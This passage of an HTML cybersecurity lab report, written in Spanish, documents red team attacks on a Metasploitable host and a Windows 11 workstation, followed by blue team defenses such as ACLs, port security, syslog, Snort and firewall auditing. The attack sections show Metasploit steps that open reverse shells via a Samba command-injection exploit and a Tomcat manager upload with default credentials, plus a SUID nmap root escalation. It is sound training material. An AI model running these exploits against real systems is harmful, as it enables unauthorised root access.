+msf > <span class="command">use exploit/multi/samba/usermap_script</span>
+msf exploit(multi/samba/usermap_script) > <span class="command">set RHOSTS 172.16.10.50</span>
+msf exploit(multi/samba/usermap_script) > <span class="command">set LHOST 172.16.40.50</span>
+msf exploit(multi/samba/usermap_script) > <span class="command">run</span>
+
+<span class="success">[*] Started reverse TCP handler on 172.16.40.50:4444</span>
+<span class="success">[*] Command shell session 1 opened (172.16.40.50:4444 -> 172.16.10.50:48121)</span>
+
+whoami
+<span class="success">root</span></pre>
+                </div>
+                
+                <div class="info-box note">
+                    <div class="info-box-icon">ℹ️</div>
+                    <div class="info-box-content">
+                        <strong>CVE-2007-2447</strong>
+                        <p>Esta vulnerabilidad permite ejecución remota de código mediante el parámetro "username" en Samba. Afecta a Samba 3.0.0 - 3.0.25rc3.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Ataque 3 -->
+        <div class="section" id="ataque3">
+            <h2>💀 2.4 Ataque #3: Tomcat + Escalación de Privilegios</h2>
+            
+            <div class="attack-card success">
+                <div class="attack-header">
+                    <span class="attack-title">Tomcat Manager + Nmap SUID PrivEsc</span>
+                    <span class="attack-badge medium">Intermedio</span>
+                </div>
+                
+                <table>
+                    <tr><td><strong>Objetivo</strong></td><td>172.16.10.50 (Metasploitable)</td></tr>
+                    <tr><td><strong>Puerto</strong></td><td>8180/tcp (Tomcat)</td></tr>
+                    <tr><td><strong>Herramienta</strong></td><td>Metasploit Framework</td></tr>
+                    <tr><td><strong>Acceso inicial</strong></td><td style="color: #ffc107;">tomcat55 (usuario limitado)</td></tr>
+                    <tr><td><strong>Acceso final</strong></td><td style="color: #28a745;"><strong>root</strong> (tras escalación)</td></tr>
+                </table>
+                
+                <h4>Fase 1: Explotación de Tomcat</h4>
+                
+                <div class="code-block has-title" data-title="Metasploit - Tomcat WAR Upload">
+<pre>msf > <span class="command">use exploit/multi/http/tomcat_mgr_upload</span>
+msf > <span class="command">set RHOSTS 172.16.10.50</span>
+msf > <span class="command">set RPORT 8180</span>
+msf > <span class="command">set HttpUsername tomcat</span>
+msf > <span class="command">set HttpPassword tomcat</span>
+msf > <span class="command">set LHOST 172.16.40.50</span>
+msf > <span class="command">set PAYLOAD java/shell_reverse_tcp</span>
+msf > <span class="command">run</span>
+
+<span class="success">[*] Command shell session 1 opened</span>
+
+whoami
+<span class="warning">tomcat55</span></pre>
+                </div>
+                
+                <h4>Fase 2: Búsqueda de vectores de escalación</h4>
+                
+                <div class="code-block has-title" data-title="Enumerar binarios SUID">
+<pre><span class="command">find / -perm -4000 -type f 2>/dev/null</span>
+
+/bin/umount
+/bin/su
+/bin/ping
+<span class="success">/usr/bin/nmap</span>   ← Vector de escalación
+/usr/bin/sudo
+...</pre>
+                </div>
+                
+                <h4>Fase 3: Escalación mediante Nmap interactivo</h4>
+                
+                <div class="code-block has-title" data-title="Privilege Escalation">
+<pre><span class="command">nmap --interactive</span>
+
+Starting Nmap V. 4.53 ( http://insecure.org )
+Welcome to Interactive Mode -- press h <enter> for help
+
+nmap> <span class="command">!sh</span>
+
+<span class="command">whoami</span>
+<span class="success">root</span>
+
+<span class="command">id</span>
+<span class="success">uid=0(root) gid=0(root)</span></pre>
+                </div>
+                
+                <div class="info-box success">
+                    <div class="info-box-icon">✅</div>
+                    <div class="info-box-content">
+                        <strong>Escalación exitosa</strong>
+                        <p>El binario nmap con bit SUID permite escapar a un shell con privilegios de root usando el modo interactivo. Esta es una técnica clásica de escalación de privilegios en sistemas Linux mal configurados.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Ataque 4 -->
+        <div class="section" id="ataque4">
+            <h2>💀 2.5 Ataque #4: Escaneo Windows 11</h2>
+            
+            <div class="attack-card success">
+                <div class="attack-header">
+                    <span class="attack-title">Reconocimiento de Workstation Windows</span>
+                    <span class="attack-badge easy">Fácil</span>
+                </div>
+                
+                <table>
+                    <tr><td><strong>Objetivo</strong></td><td>172.16.30.100 (Windows 11)</td></tr>
+                    <tr><td><strong>Herramienta</strong></td><td>Nmap</td></tr>
+                    <tr><td><strong>Resultado</strong></td><td>Puertos SMB expuestos</td></tr>
+                </table>
+                
+                <div class="code-block has-title" data-title="Resultado del escaneo">
+<pre><span class="command">nmap -sV -p 135,139,445,3389,5985 172.16.30.100</span>
+
+PORT     STATE  SERVICE       VERSION
+<span class="success">135/tcp  open   msrpc         Microsoft Windows RPC</span>
+<span class="success">139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn</span>
+<span class="success">445/tcp  open   microsoft-ds?</span>
+<span class="warning">3389/tcp closed ms-wbt-server</span>
+<span class="warning">5985/tcp closed wsman</span></pre>
+                </div>
+                
+                <div class="info-box note">
+                    <div class="info-box-icon">📝</div>
+                    <div class="info-box-content">
+                        <strong>Hallazgos</strong>
+                        <p>Puertos SMB (135, 139, 445) abiertos cuando el Firewall está desactivado. RDP (3389) y WinRM (5985) cerrados. En un escenario real, los puertos SMB podrían usarse para enumerar shares, usuarios y potencialmente explotar vulnerabilidades como EternalBlue.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ==================== ETAPA 3: BLUE TEAM ==================== -->
+        <div class="phase-header blueteam">
+            <h2>🛡️ ETAPA 3: BLUE TEAM</h2>
+            <p>Detección, Prevención y Monitoreo de Amenazas</p>
+        </div>
+
+        <!-- Defensa 1 -->
+        <div class="section" id="defensa1">
+            <h2>🔒 3.1 ACL - Bloqueo de Puertos Peligrosos</h2>
+            
+            <div class="defense-card">
+                <div class="defense-header">
+                    <span class="defense-title">Access Control List en RT-EDGE</span>
+                    <span class="badge badge-green">✓ Implementado</span>
+                </div>
+                
+                <p>Bloqueo de puertos vulnerables identificados durante el reconocimiento:</p>
+                
+                <div class="code-block has-title" data-title="RT-EDGE - ACL PROTECT_DMZ">
+<pre>ip access-list extended PROTECT_DMZ
+ remark === PERMITIR GESTION ===
+ permit tcp 172.16.40.0 0.0.0.255 any eq 22
+ permit icmp any any
+ remark === BLOQUEAR PUERTOS PELIGROSOS A DMZ ===
+ deny tcp any host 172.16.10.50 eq 1524 log    <span class="comment">! Backdoor</span>
+ deny tcp any host 172.16.10.50 eq 512 log     <span class="comment">! rexec</span>
+ deny tcp any host 172.16.10.50 eq 513 log     <span class="comment">! rlogin</span>
+ deny tcp any host 172.16.10.50 eq 514 log     <span class="comment">! rsh</span>
+ deny tcp any host 172.16.10.50 eq 445 log     <span class="comment">! SMB</span>
+ deny tcp any host 172.16.10.50 eq 139 log     <span class="comment">! NetBIOS</span>
+ deny tcp any host 172.16.10.50 eq 6667 log    <span class="comment">! IRC</span>
+ deny tcp any host 172.16.10.50 eq 6697 log    <span class="comment">! IRC SSL</span>
+ remark === PERMITIR TODO LO DEMAS ===
+ permit ip any any
+
+interface GigabitEthernet0/1
+ ip access-group PROTECT_DMZ in</pre>
+                </div>
+                
+                <h4>Verificación</h4>
+                
+                <div class="code-block has-title" data-title="Prueba de bloqueo">
+<pre><span class="command">nc 172.16.10.50 1524</span>
+<span class="danger">(UNKNOWN) [172.16.10.50] 1524 (ingreslock) : No route to host</span>
+
+<span class="success">✓ Puerto 1524 bloqueado exitosamente</span></pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- Defensa 2 -->
+        <div class="section" id="defensa2">
+            <h2>🔒 3.2 Port Security</h2>
+            
+            <div class="defense-card">
+                <div class="defense-header">
+                    <span class="defense-title">Seguridad de Puertos en SW-DMZ</span>
+                    <span class="badge badge-green">✓ Implementado</span>
+                </div>
+                
+                <p>Prevención de ataques de MAC flooding y dispositivos no autorizados:</p>
+                
+                <div class="code-block has-title" data-title="SW-DMZ - Port Security">
+<pre>interface range FastEthernet0/2-24
+ switchport mode access
+ switchport port-security
+ switchport port-security maximum 2
+ switchport port-security violation restrict
+ switchport port-security mac-address sticky</pre>
+                </div>
+                
+                <div class="code-block has-title" data-title="Verificación">
+<pre>SW-DMZ# <span class="command">show port-security interface FastEthernet0/2</span>
+
+Port Security              : <span class="success">Enabled</span>
+Port Status                : Secure-up
+Violation Mode             : Restrict
+Maximum MAC Addresses      : 2
+Total MAC Addresses        : 1
+Sticky MAC Addresses       : 1
+Last Source Address:Vlan   : 00e0.4c0a.2224:10
+Security Violation Count   : 0</pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- Defensa 3 -->
+        <div class="section" id="defensa3">
+            <h2>🔒 3.3 SPAN/Port Mirror</h2>
+            
+            <div class="defense-card">
+                <div class="defense-header">
+                    <span class="defense-title">Monitoreo de Tráfico en SW-CORE-HQ</span>
+                    <span class="badge badge-green">✓ Configurado</span>
+                </div>
+                
+                <p>Copia de todo el tráfico de VLAN 40 para análisis con IDS/Wireshark:</p>
+                
+                <div class="code-block has-title" data-title="SW-CORE-HQ - SPAN Session">
+<pre>monitor session 1 source vlan 40
+monitor session 1 destination interface GigabitEthernet1/0/20</pre>
+                </div>
+                
+                <div class="code-block has-title" data-title="Verificación">
+<pre>SW-CORE-HQ# <span class="command">show monitor session 1</span>
+
+Session 1
+---------
+Type                     : Local Session
+Source VLANs             : 
+    Both                 : 40
+Destination Ports        : Gi1/0/20
+    Encapsulation        : Native
+    Ingress              : Disabled</pre>
+                </div>
+                
+                <div class="info-box note">
+                    <div class="info-box-icon">💡</div>
+                    <div class="info-box-content">
+                        <strong>Uso</strong>
+                        <p>Conectar un dispositivo de análisis (Wireshark, Snort, Suricata) al puerto Gi1/0/20 para capturar todo el tráfico de la VLAN de administración.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Defensa 4 -->
+        <div class="section" id="defensa4">
+            <h2>🔒 3.4 Logging Centralizado (Syslog)</h2>
+            
+            <div class="defense-card">
+                <div class="defense-header">
+                    <span class="defense-title">Envío de Logs a Kali Linux</span>
+                    <span class="badge badge-green">✓ Implementado</span>
+                </div>
+                
+                <p>Los eventos de seguridad de RT-EDGE se envían a Kali para monitoreo centralizado:</p>
+                
+                <div class="code-block has-title" data-title="RT-EDGE - Syslog">
+<pre>logging host 172.16.40.50
+logging trap informational
+logging source-interface GigabitEthernet0/1</pre>
+                </div>
+                
+                <div class="code-block has-title" data-title="Kali - Recepción de logs">
+<pre><span class="command">sudo tcpdump -i eth0 -n udp port 514</span>
+
+<span class="success">21:30:19.776836 IP 10.0.0.1.54849 > 172.16.40.50.514: SYSLOG local7.info</span>
+<span class="success">21:30:34.080384 IP 10.0.0.1.54849 > 172.16.40.50.514: SYSLOG local7.info</span></pre>
+                </div>
+                
+                <div class="code-block has-title" data-title="RT-EDGE - Log de bloqueos ACL">
+<pre>*Apr 18 23:23:02.195: <span class="danger">%SEC-6-IPACCESSLOGP: list PROTECT_DMZ denied tcp 
+    172.16.40.50(40158) -> 172.16.10.50(1524), 1 packet</span></pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- Defensa 5 -->
+        <div class="section" id="defensa5">
+            <h2>🔒 3.5 Snort IDS</h2>
+            
+            <div class="defense-card">
+                <div class="defense-header">
+                    <span class="defense-title">Sistema de Detección de Intrusos</span>
+                    <span class="badge badge-green">✓ Implementado</span>
+                </div>
+                
+                <p>Snort 3 configurado en Kali para monitorear tráfico de red:</p>
+                
+                <div class="code-block has-title" data-title="Ejecución de Snort">
+<pre><span class="command">sudo snort -i eth0</span>
+
+--------------------------------------------------
+o")~   Snort++ 3.12.1.0
+--------------------------------------------------
+pcap DAQ configured to passive.
+Commencing packet processing
+++ [0] eth0</pre>
+                </div>
+                
+                <div class="code-block has-title" data-title="Estadísticas capturadas">
+<pre>Packet Statistics
+--------------------------------------------------
+daq
+                 received: 119
+                 analyzed: 119
+                    allow: 119
+--------------------------------------------------
+codec
+                    icmp4: 60           ( 50.420%)
+                      tcp: 10           (  8.403%)
+                      udp: 11           (  9.244%)
+--------------------------------------------------
+timing
+                  runtime: 00:00:54
+                 pkts/sec: 2</pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- Defensa 6 -->
+        <div class="section" id="defensa6">
+            <h2>🔒 3.6 Análisis con Wireshark</h2>
+            
+            <div class="defense-card">
+                <div class="defense-header">
+                    <span class="defense-title">Captura y Análisis de Ataques</span>
+                    <span class="badge badge-green">✓ Implementado</span>
+                </div>
+                
+                <p>Captura de tráfico durante un escaneo Nmap para análisis forense:</p>
+                
+                <div class="code-block has-title" data-title="Filtro aplicado">
+<pre>ip.addr == 172.16.10.50</pre>
+                </div>
+                
+                <h4>Hallazgos en la captura:</h4>
+                
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Color</th>
+                            <th>Tipo</th>
+                            <th>Significado</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td style="background: #28a745; color: white; text-align: center;">Verde</td>
+                            <td>TCP SYN-ACK</td>
+                            <td>Puerto abierto (21, 22, 23)</td>
+                        </tr>
+                        <tr>
+                            <td style="background: #dc3545; color: white; text-align: center;">Rojo</td>
+                            <td>TCP RST</td>
+                            <td>Puerto cerrado o conexión rechazada</td>
+                        </tr>
+                        <tr>
+                            <td style="background: #ffc107; color: black; text-align: center;">Amarillo</td>
+                            <td>ICMP Unreachable</td>
+                            <td>Tráfico bloqueado por ACL</td>
+                        </tr>
+                    </tbody>
+                </table>
+                
+                <div class="info-box success">
+                    <div class="info-box-icon">✅</div>
+                    <div class="info-box-content">
+                        <strong>Evidencia de defensa</strong>
+                        <p>Los paquetes ICMP "Destination unreachable (Communication administratively filtered)" confirman que la ACL PROTECT_DMZ está bloqueando el tráfico malicioso.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Defensa 7 -->
+        <div class="section" id="defensa7">
+            <h2>🔒 3.7 Windows Firewall</h2>
+            
+            <div class="defense-card">
+                <div class="defense-header">
+                    <span class="defense-title">Protección de Endpoint Windows</span>
+                    <span class="badge badge-green">✓ Verificado</span>
+                </div>
+                
+                <p>Demostración de la efectividad del Windows Firewall:</p>
+                
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Estado del Firewall</th>
+                            <th>Resultado del escaneo</th>
+                            <th>Conclusión</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong style="color: #28a745;">Activado</strong></td>
+                            <td>Sin respuesta / Timeout</td>
+                            <td>✓ Protección efectiva</td>
+                        </tr>
+                        <tr>
+                            <td><strong style="color: #dc3545;">Desactivado</strong></td>
+                            <td>Puertos 135, 139, 445 visibles</td>
+                            <td>⚠️ Sistema expuesto</td>
+                        </tr>
+                    </tbody>
+                </table>
+                
+                <div class="code-block has-title" data-title="Comandos de auditoría">
+<pre><span class="comment"># Habilitar auditoría de conexiones</span>
+auditpol /set /subcategory:"Filtering Platform Packet Drop" /success:enable /failure:enable
+auditpol /set /subcategory:"Filtering Platform Connection" /success:enable /failure:enable
+
+<span class="comment"># Habilitar logging del Firewall</span>
+netsh advfirewall set allprofiles logging droppedconnections enable
+netsh advfirewall set allprofiles logging allowedconnections enable
+
+<span class="comment"># Ver logs</span>
+Get-Content C:\Windows\System32\LogFiles\Firewall\pfirewall.log -Tail 30</pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- ==================== CONCLUSIONES ==================== -->
+        <div class="phase-header infrastructure">
+            <h2>📊 CONCLUSIONES</h2>
+            <p>Resumen de Resultados y Recomendaciones</p>
+        </div>
+
+        <!-- Resumen -->
+        <div class="section" id="resumen">
+            <h2>📈 4.1 Resumen de Resultados</h2>
+            
+            <div class="results-grid">
+                <div class="result-card">
+                    <h4>⚔️ Red Team - Ataques Exitosos</h4>
+                    <table>
+                        <tr><td>Backdoor 1524</td><td style="color: #28a745;">✓ Root</td></tr>
+                        <tr><td>Samba RCE</td><td style="color: #28a745;">✓ Root</td></tr>
+                        <tr><td>Tomcat + PrivEsc</td><td style="color: #28a745;">✓ Root</td></tr>
+                        <tr><td>Windows Recon</td><td style="color: #28a745;">✓ SMB expuesto</td></tr>
+                    </table>
+                </div>
+                
+                <div class="result-card">
+                    <h4>🛡️ Blue Team - Defensas Implementadas</h4>
+                    <table>
+                        <tr><td>ACL Bloqueo</td><td style="color: #28a745;">✓ Activo</td></tr>
+                        <tr><td>Port Security</td><td style="color: #28a745;">✓ Activo</td></tr>
+                        <tr><td>SPAN/Mirror</td><td style="color: #28a745;">✓ Configurado</td></tr>
+                        <tr><td>Syslog</td><td style="color: #28a745;">✓ Activo</td></tr>
+                        <tr><td>Snort IDS</td><td style="color: #28a745;">✓ Activo</td></tr>
+                        <tr><td>Wireshark</td><td style="color: #28a745;">✓ Capturando</td></tr>
+                        <tr><td>Windows FW</td><td style="color: #28a745;">✓ Verificado</td></tr>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Lecciones -->
+        <div class="section" id="lecciones">
+            <h2>📚 4.2 Lecciones Aprendidas</h2>
+            
+            <div class="info-box note">
+                <div class="info-box-icon">1️⃣</div>
+                <div class="info-box-content">
+                    <strong>Segmentación de red es crítica</strong>
+                    <p>La separación de VLANs permite aplicar controles específicos por zona. El atacante en VLAN 40 tuvo que atravesar el router para llegar a la DMZ, permitiendo la aplicación de ACLs.</p>
+                </div>
+            </div>
+            
+            <div class="info-box note">
+                <div class="info-box-icon">2️⃣</div>
+                <div class="info-box-content">
+                    <strong>Defensa en profundidad</strong>
+                    <p>Ningún control es suficiente por sí solo. La combinación de ACLs + Port Security + IDS + Logging proporciona múltiples capas de protección y detección.</p>
+                </div>
+            </div>
+            
+            <div class="info-box note">
+                <div class="info-box-icon">3️⃣</div>
+                <div class="info-box-content">
+                    <strong>Monitoreo es esencial</strong>
+                    <p>Sin logging centralizado y análisis de tráfico, los ataques pasan desapercibidos. Syslog, Snort y Wireshark proporcionan visibilidad del tráfico malicioso.</p>
+                </div>
+            </div>
+            
+            <div class="info-box note">
+                <div class="info-box-icon">4️⃣</div>
+                <div class="info-box-content">
+                    <strong>Servicios innecesarios = superficie de ataque</strong>
+                    <p>Metasploitable demuestra cómo servicios obsoletos o mal configurados (backdoors, versiones vulnerables) facilitan el compromiso total del sistema.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Mejoras -->
+        <div class="section" id="mejoras">
+            <h2>🚀 4.3 Mejoras Futuras</h2>
+            
+            <table>
+                <thead>
+                    <tr>
+                        <th>Mejora</th>
+                        <th>Descripción</th>
+                        <th>Beneficio</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Active Directory</td>
+                        <td>Agregar Windows Server como DC</td>
+                        <td>Practicar ataques de AD (Kerberoasting, Pass-the-Hash)</td>
+                    </tr>
+                    <tr>
+                        <td>SIEM</td>
+                        <td>Implementar ELK Stack o Splunk</td>
+                        <td>Correlación de eventos y alertas</td>
+                    </tr>
+                    <tr>
+                        <td>IPS</td>
+                        <td>Configurar Suricata en modo inline</td>
+                        <td>Bloqueo automático de ataques</td>
+                    </tr>
+                    <tr>
+                        <td>Honeypot</td>
+                        <td>Agregar Cowrie o T-Pot</td>
+                        <td>Detección de intrusos y recolección de TTPs</td>
+                    </tr>
+                    <tr>
+                        <td>VPN Site-to-Site</td>
+                        <td>Cifrar tráfico HQ-Branch</td>
+                        <td>Protección de datos en tránsito</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p>📘 <strong>Laboratorio de Ciberseguridad</strong> - Documentación Completa</p>
+            <p>Elaborado por: Ramos | Abril 2026</p>
+            <p>Topología Híbrida Multi-Sitio | Red Team & Blue Team</p>
+            <br>
+            <p>🔗 <a href="https://github.com">Ver en GitHub</a></p>
+        </div>
+
+    </div>
+</body>
+</html>
